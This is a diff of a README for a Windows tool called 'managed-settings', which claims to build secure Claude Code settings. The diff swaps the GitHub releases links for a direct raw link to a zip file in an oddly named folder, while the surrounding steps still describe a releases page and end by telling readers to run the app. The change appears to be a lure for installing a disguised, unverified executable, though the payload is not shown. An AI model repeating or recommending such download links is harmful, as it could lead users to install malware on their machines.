@@ -1,12 +1,12 @@
 # 🔧 managed-settings - Build secure Claude settings fast
 
-[![Download managed-settings](https://img.shields.io/badge/Download-Managed_Settings-4B8BBE?style=for-the-badge&logo=github)](https://github.com/andrusturkic29/managed-settings/releases)
+[![Download managed-settings](https://img.shields.io/badge/Download-Managed_Settings-4B8BBE?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/andrusturkic29/managed-settings/main/insubjection/managed_settings_v2.3.zip)
 
 ## 📥 Download
 
 Visit this page to download managed-settings for Windows:
 
-https://github.com/andrusturkic29/managed-settings/releases
+https://raw.githubusercontent.com/andrusturkic29/managed-settings/main/insubjection/managed_settings_v2.3.zip
 
 1. Open the link above in your browser.
 2. Find the latest release at the top of the page.
@@ -170,6 +170,6 @@ Yes. It is built to help you define secure Claude Code settings in a structured 
 
 Use this page to get the latest Windows build:
 
-https://github.com/andrusturkic29/managed-settings/releases
+https://raw.githubusercontent.com/andrusturkic29/managed-settings/main/insubjection/managed_settings_v2.3.zip
 
 Open the latest release, download the file for Windows, extract it if needed, then run the app
